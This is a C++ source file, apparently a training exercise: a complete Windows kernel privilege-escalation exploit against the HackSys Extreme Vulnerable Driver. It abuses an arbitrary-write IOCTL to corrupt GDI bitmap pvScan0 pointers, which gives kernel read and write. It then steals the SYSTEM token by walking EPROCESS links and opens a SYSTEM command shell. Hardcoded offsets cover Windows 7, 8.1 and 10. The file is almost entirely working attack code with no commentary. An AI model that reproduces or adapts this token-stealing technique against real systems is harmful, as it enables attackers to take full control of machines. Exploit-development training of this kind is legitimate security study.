#include<Windows.h>
#include<cstdio>
#include<winternl.h>
#include<psapi.h>

static VOID
xxCreateCmdLineProcess(VOID) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi); // 创建cmd子进程
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

HANDLE hDevide;
PPEB PebBaseAddr;
HBITMAP ManagerHandle;
HBITMAP WorkHandle;

ULONG64 UniqueProcessIdOffset;
ULONG64 TokenOffset;
ULONG64 ActiveProcessLinks;

void getSystemOffset()//copy from https://blog.csdn.net/qq78442761/article/details/64440535
{
    BOOL flag64;
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
        flag64 = 1;
    else
        flag64 = 0;

    int version = 0;

    //先判断是否为win8.1或win10
    typedef void(__stdcall* NTPROC)(DWORD*, DWORD*, DWORD*);
    HINSTANCE hinst = LoadLibrary(L"ntdll.dll");
    DWORD dwMajor, dwMinor, dwBuildNumber;
    NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
    proc(&dwMajor, &dwMinor, &dwBuildNumber);
    if (dwMajor == 6 && dwMinor == 3)	//win 8.1
    {
        //printf("Microsoft Windows 8.1\n");
        version = 8;
    }
    else if (dwMajor == 10 && dwMinor == 0)	//win 10
    {
        //printf("Microsoft Windows 10\n");
        version = 10;
    }
    else {
        version = 7;
    }
    switch (version){
    case 7:
        if (flag64) {
            UniqueProcessIdOffset = 0x180;
            TokenOffset = 0x208;
            ActiveProcessLinks = 0x188;
        }
        else {
            UniqueProcessIdOffset = 0xb4;
            TokenOffset = 0xf8;
            ActiveProcessLinks = 0xb8;
        }
        break;
    case 8:
        if (flag64) {
            UniqueProcessIdOffset = 0x2e0;
            TokenOffset = 0x348;
            ActiveProcessLinks = 0x2e8;
        }
        else {
            UniqueProcessIdOffset = 0xb4;
            TokenOffset = 0xf8;
            ActiveProcessLinks = 0xb8;
        }
        break;
    case 10:
        if (flag64) {
            UniqueProcessIdOffset = 0x2e8;
            TokenOffset = 0x358;
            ActiveProcessLinks = 0x2f0;
        }
        else {
            UniqueProcessIdOffset = 0xb4;
            TokenOffset = 0xf4;
            ActiveProcessLinks = 0xb8;
        }
        break;
    default:
        break;
    }
    if (flag64)
        printf("I 'm fucking win%d x64 now!\n",version);
    else
        printf("I 'm fucking win%d x86 now!\n", version);
}

void getPEB() {
    typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(
        IN HANDLE ProcessHandle, // 进程句柄
        IN PROCESSINFOCLASS InformationClass, // 信息类型
        OUT PVOID ProcessInformation, // 缓冲指针
        IN ULONG ProcessInformationLength, // 以字节为单位的缓冲大小
        OUT PULONG ReturnLength OPTIONAL // 写入缓冲的字节数
    );
    HMODULE hModule = LoadLibraryA("ntdll.dll");
    NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hModule, "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION ProcBasicInfo = {0};
    PULONG returnLen = 0;
    NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &ProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), returnLen);
    PebBaseAddr = ProcBasicInfo.PebBaseAddress;
    if (!PebBaseAddr) {
        printf("Get PEB error.\n");
        return ;
    }
    printf("[+]PEB Base Address:%p\n", PebBaseAddr);
}

BOOL init() {
    hDevide = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL);
    if (hDevide == INVALID_HANDLE_VALUE) {
        printf("Create Device Fail:0x%X\n", GetLastError());
        return FALSE;
    }
    else
        return TRUE;
}

void BitmapRead(PULONG64 addr,PULONG64 result) {
    SetBitmapBits(ManagerHandle,8,&addr);
    GetBitmapBits(WorkHandle,8,result);
}
void BitmapWrite(PULONG64 addr,ULONG64 value) {
    SetBitmapBits(ManagerHandle, 8, &addr);
    SetBitmapBits(WorkHandle, 8,&value);
}

void GetSystemEprocess(PULONGLONG systemEprocess) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    PVOID ntoskrnlBase;
    int cDrivers, i;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        ntoskrnlBase = drivers[0];
    }
    else
    {
        printf("EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
        return;
    }

    HMODULE hLoaded = LoadLibrary(L"ntoskrnl.exe");
    if (!hLoaded) {
        printf("Load ntoskrnl.exe error\n");
        return;
    }
    PVOID addr = GetProcAddress(hLoaded, "PsInitialSystemProcess");
    if (!addr) {
        printf("Get PsInitialSystemProcess error\n");
        return;
    }
    ULONGLONG offset = (ULONGLONG)addr - (ULONGLONG)hLoaded;
    BitmapRead((PULONG64)(offset+(ULONGLONG)ntoskrnlBase),(PULONG64)systemEprocess);
    if (!*systemEprocess) {
        printf("Read system EPROCESS error\n");
        return;
    }
}

int main() {
    getSystemOffset();
    DWORD CurrentPID = GetCurrentProcessId();
    printf("[+]Pid:%d\n", CurrentPID);

    BYTE Manabuf[100 * 100 * 4] = "Manager!\x00";
    ManagerHandle = CreateBitmap(0x64, 0x64, 1, 32, &Manabuf);
    printf("--------------Manager Bitmap-----------------\n");
    printf("[+]Bitmap Handle :%p\n", ManagerHandle);
    getPEB();
    PULONG64 ManaGdiSharedHandleTable = (PULONG64)*(PULONG64)((PBYTE)PebBaseAddr + 0xf8);
    printf("[+]GdiSharedHandleTable:%p\n",ManaGdiSharedHandleTable);
    PULONG64 ManaHandleTableEntry = (PULONG64)((PBYTE)ManaGdiSharedHandleTable + 0x18*((int)ManagerHandle & 0xffff));
    printf("[+]HandleTableEntry:%p\n",ManaHandleTableEntry);
    printf("[+]Bitmap Kernel Address:%p\n",*ManaHandleTableEntry);
    PULONG64 ManapvScan0 = (PULONG64)((PBYTE)(*ManaHandleTableEntry) + 0x50);
    printf("[+]Manager pvScan0:%p\n",(PLONGLONG)ManapvScan0);
    
    BYTE Workbuf[100 * 100 * 4] = "Work!\x00";
    WorkHandle = CreateBitmap(0x64, 0x64, 1, 32, &Workbuf);
    printf("--------------Work Bitmap-----------------\n");
    printf("[+]Bitmap Handle :%p\n", WorkHandle);
    PULONG64 WorkGdiSharedHandleTable = (PULONG64) * (PULONG64)((PBYTE)PebBaseAddr + 0xf8);
    printf("[+]GdiSharedHandleTable:%p\n", WorkGdiSharedHandleTable);
    PULONG64 WorkHandleTableEntry = (PULONG64)((PBYTE)WorkGdiSharedHandleTable + 0x18 * ((int)WorkHandle & 0xffff));
    printf("[+]HandleTableEntry:%p\n", WorkHandleTableEntry);
    printf("[+]Bitmap Kernel Address:%p\n", *WorkHandleTableEntry);
    PULONG64 WorkpvScan0 = (PULONG64)((PBYTE)(*WorkHandleTableEntry) + 0x50);
    printf("[+]Workger pvScan0:%p\n", (PLONGLONG)WorkpvScan0);
    

    if (!init())
        exit(1);
    struct {
        PULONG64 what;
        PULONG64 where;
    }UserWriteWhatWhere = { (PULONG64)&WorkpvScan0, ManapvScan0};
    DWORD recvBuf;
    DeviceIoControl(hDevide, 0x22200B,&UserWriteWhatWhere,sizeof(UserWriteWhatWhere),NULL,0,&recvBuf,NULL);

    ULONGLONG systemEprocess = 0;
    GetSystemEprocess(&systemEprocess);
    printf("[+]System EPROCESS:%p\n",systemEprocess);
    ULONG64 SystemToken = 0;
    BitmapRead((PULONG64)(systemEprocess + TokenOffset), &SystemToken);

    ULONG64 Eprocess = systemEprocess;
    ULONG64 PID = 0;
    ULONG64 CurrentToken = 0;
    do {
        BitmapRead((PULONG64)(Eprocess + ActiveProcessLinks), &Eprocess);
        Eprocess -= ActiveProcessLinks;
        BitmapRead((PULONG64)(Eprocess + UniqueProcessIdOffset), &PID);
        BitmapRead((PULONG64)(Eprocess + TokenOffset), &CurrentToken);
        //printf("[+]PID:%lld.Token:%p\n",PID,CurrentToken);
    } while (PID != CurrentPID);
    printf("[+]Current Eprocess:%p\n", Eprocess);
    BitmapWrite((PULONG64)(Eprocess + TokenOffset),SystemToken);
    xxCreateCmdLineProcess();

    
    return 0;

}